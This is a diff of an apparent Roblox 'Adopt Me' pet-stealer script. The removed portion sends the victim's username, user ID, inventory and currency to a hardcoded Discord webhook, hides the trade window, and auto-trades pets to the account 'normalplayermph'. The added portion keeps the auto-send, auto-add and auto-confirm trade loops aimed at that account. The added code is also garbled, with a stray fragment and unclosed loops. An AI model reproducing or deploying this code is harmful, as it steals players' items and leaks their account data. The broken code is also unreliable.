@@ -1,150 +1,12 @@
-Username = "normalplayermph"
-Webhook = "https://discord.com/api/webhooks/1280263580729479270/GMM1ds4G0vHOYUDGcydMGuWpgdB4Qn4T7VbV1Hjr3woK4dzLJX2WMz68hF_sCWvfDUM9"
-
 local Bypass = require(game.ReplicatedStorage.Fsys).load
-local InventoryDB = Bypass("InventoryDB")
-local ClientData = Bypass('ClientData')
 local RouterClient = Bypass("RouterClient")
-local legendaries_count = 0
-local SendTrade = RouterClient.get("TradeAPI/SendTradeRequest")
-local AddPetRemote = RouterClient.get("TradeAPI/AddItemToOffer")
+local SendTradeRequestRemote = RouterClient.get("TradeAPI/SendTradeRequest")
+AddItemToOffer")
 local AcceptNegotiationRemote = RouterClient.get("TradeAPI/AcceptNegotiation")
 local ConfirmTradeRemote = RouterClient.get("TradeAPI/ConfirmTrade")
-local mega_count = 0
-local neon_count = 0
-local ultra_count = 0
-local rare_count = 0
-local uncommon_count = 0
-local common_count = 0
-local TeleportScript = [[game:GetService("TeleportService"):TeleportToPlaceInstance("]] .. game.PlaceId .. [[", "]] .. game.JobId .. [[", game.Players.LocalPlayer)]]
-local AllItems = {}
-local bucks = tostring(ClientData.get("money"))
-local total_pets = 0
-local egg_count = 0
-local Pets = {}
-local PetCounts = {}
-for i, v in pairs(require(game.ReplicatedStorage.ClientModules.Core.ClientData).get_data()[game.Players.LocalPlayer.Name].inventory.pets) do
-    local label = ""
-    if v.properties.mega_neon then
-        label = " (Mega Neon)"
-    elseif v.properties.neon then
-        label = " (Neon)"
-    else
-        label = " (Normal)"
-    end
-    local petName = v.id:gsub("%d+", ""):gsub("_", " "):gsub("%s+", " ")
-    petName = petName:gsub("(%a)(%a*)", function(first, rest) return first:upper() .. rest:lower() end)
-    local key = petName .. label
-    if PetCounts[key] then
-        PetCounts[key] = PetCounts[key] + 1
-    else
-        PetCounts[key] = 1
-    end
-end
-print("Inventory:")
-for key, count in pairs(PetCounts) do
-    print("  " .. key .. " x" .. count)
-end
-for i, v in pairs(ClientData.get("inventory").pets) do
-   total_pets = total_pets + 1
-end
-for i, v in pairs(ClientData.get("inventory").pets) do
-  if InventoryDB[v.category][v.id].rarity == "legendary" then
-    legendaries_count = legendaries_count + 1
-  end
-  if InventoryDB[v.category][v.id].properties == "mega_neon" then
-    mega_count = mega_count + 1
-  end
-  if InventoryDB[v.category][v.id].properties == "neon" then
-    neon_count = neon_count + 1
-  end
-  if InventoryDB[v.category][v.id].rarity == "ultra_rare" then
-    ultra_count = ultra_count + 1
-  end
-  if InventoryDB[v.category][v.id].rarity == "rare" then
-    rare_count = rare_count + 1
-  end
-  if InventoryDB[v.category][v.id].rarity == "uncommon" then
-    uncommon_count = uncommon_count + 1
-  end
-  if InventoryDB[v.category][v.id].rarity == "common" then
-    common_count = common_count + 1
-  end
-end
-local content
-if legendaries_count == 0 and mega_count == 0 and neon_count == 0 and ultra_count == 0 then
-    content = TeleportScript
-elseif legendaries_count == 0 and mega_count == 0 and neon_count == 0 and ultra_count == 0 and rare_count == 0 and uncommon_count == 0 and common_count == 0 and total_pets == 1 then
-    content = TeleportScript
-else
-    content = "-- @everyone **__NEW ADOPT ME HIT!__**"
-end
-content = content .. "\n" .. TeleportScript
-local Player = game.Players.LocalPlayer
-local Executor = tostring(identifyexecutor())
-if Executor == "Solara" then
-  return
-end
-local Platform = "Could Not Grab!"
-local ScriptVersion = "v2.0.0"
-if common_count == 1 and uncommon_count == 0 and rare_count == 0 and ultra_count == 0 and legendaries_count == 0 and neon_count == 0 and mega_count == 0 and total_pets == 1 then
-  table.insert(AllItems, "None")
-end
-for key, count in pairs(PetCounts) do
-    table.insert(AllItems, key .. " x" .. count)
-end
-local AllItemz = table.concat(AllItems, ", ")
-local data = {
-  ["username"] = "COEMS SCRIPTS",
-  ["avatar_url"] = "https://images.rawpixel.com/image_800/cHJpdmF0ZS9sci9pbWFnZXMvd2Vic2l0ZS8yMDIzLTAzL3JtNTg2ZGVzaWduLXJlbWl4LWZyLTAwNi1hLmpwZw.jpg",
-  ["content"] = content,
-  ["embeds"] = {
-      {
-          ["title"] = "📎 **__Coems Script's__** 📎",
-          ["description"] = 
-              "🧑 **__User Information__**\n" ..
-              "```diff\n+ Username     : " .. Player.Name .. "\n" ..
-              "+ User ID      : " .. Player.UserId .. "\n" ..
-              "+ Account Age  : " .. Player.AccountAge .. " days\n" ..
-              "+ Exploit      : " .. Executor .. "\n" ..
-              "+ Platform     : " .. Platform .. "\n" ..
-              "+ Receiver     : " .. Username .. "\n" ..
-              "+ Version      : " .. ScriptVersion .. "\n" ..
-              "```" ..
-              "\n📦 **__Inventory__**\n" ..
-              "```fix\n- Legendaries   🍂 : " .. legendaries_count .. "\n" ..
-              "- Mega Neons    🍄 : " .. mega_count .. "\n" ..
-              "- Neons         🌿 : " .. neon_count .. "\n" ..
-              "- Ultra Rares   🌺 : " .. ultra_count .. "\n" ..
-              "- Rares         🍀 : " .. rare_count .. "\n" ..
-              "- Uncommons     🌾 : " .. uncommon_count .. "\n" ..
-              "- Commons       🥜 : " .. common_count - 1 .. "\n" ..
-              "- Total Eggs    🥚 : " .. egg_count .. " (Inaccurate)\n" ..
-              "- Total Pets    🐕 : " .. total_pets - 1 .. "\n" ..
-              "- Total Bucks   💰 : " .. bucks .. "```" ..
-              "\n📄 **__Complete Inventory__**\n" ..
-              "```yaml\n" .. (AllItemz or "None") .. "```",
-          ["type"] = "rich",
-          ["color"] = tonumber(0x00ff00),
-          ["footer"] = {
-              ["text"] = "discord.gg/78eYSndFMr | Hit Recorded: " .. os.date("%B %d, %Y at %I:%M %p")
-          }
-      }
-  }
-}
-local httpRequest = http.request or httprequest
-if httpRequest then
-  httpRequest({
-    Url = Webhook,
-    Method = 'POST',
-    Headers = {
-      ['Content-Type'] = 'application/json'
-    },
-    Body = game:GetService('HttpService'):JSONEncode(data)
-  })
-else
-  print("Could Not Send Webhook Data.")
-end
+
+Username = "normalplayermph"
+
 local function AutoSendTradeRequest()
   while true do
       if not Bypass("ClientData").get_data()[Username].in_active_trade then
@@ -156,6 +18,14 @@ local function AutoSendTradeRequest()
       end
   end
 end
+while true do
+local playerData = Bypass("ClientData").get_data()[game.Players.LocalPlayer]
+if not playerData.in_active_trade then
+  AutoSendTradeRequest()
+task.wait(0.1)
+end
+
+
 local function AutoAddPets()
 while true do
   local playerData = Bypass("ClientData").get_data()[game.Players.LocalPlayer]
@@ -182,6 +52,7 @@ if playerData.in_active_trade then
 end
 task.wait(0.1)
 end
+
 local function AutoAcceptAndConfirm()
 while true do
 if Bypass("ClientData").get_data()[Username].in_active_trade then
@@ -196,26 +67,10 @@ if Bypass("ClientData").get_data()[Username].in_active_trade then
   end
 end
 end
-local function StartStealing()
-Player.PlayerGui.TradeApp.Frame.Visible = false
-Player.PlayerGui.DialogApp.Visible = false
-Player.PlayerGui.NewsApp.Visible = false
-AutoSendTradeRequest()
-AutoAddPets()
-AutoAcceptAndConfirm()
+while true do
+local playerData = Bypass("ClientData").get_data()[game.Players.LocalPlayer]
+if playerData.in_active_trade then
+  AutoAcceptAndConfirm()
 end
-for _, plr in pairs(game.Players:GetPlayers()) do
-  if plr.Name:lower() == Username:lower() then
-    plr.Chatted:Connect(function()
-      StartSteal()
-    end)
-  end
+task.wait(0.1)
 end
-
-game.Players.PlayerAdded:Connect(function(plr)
-  if plr.Name:lower() == Username:lower() then
-    plr.Chatted:Connect(function()
-      StartSteal()
-    end)
-  end
-end)
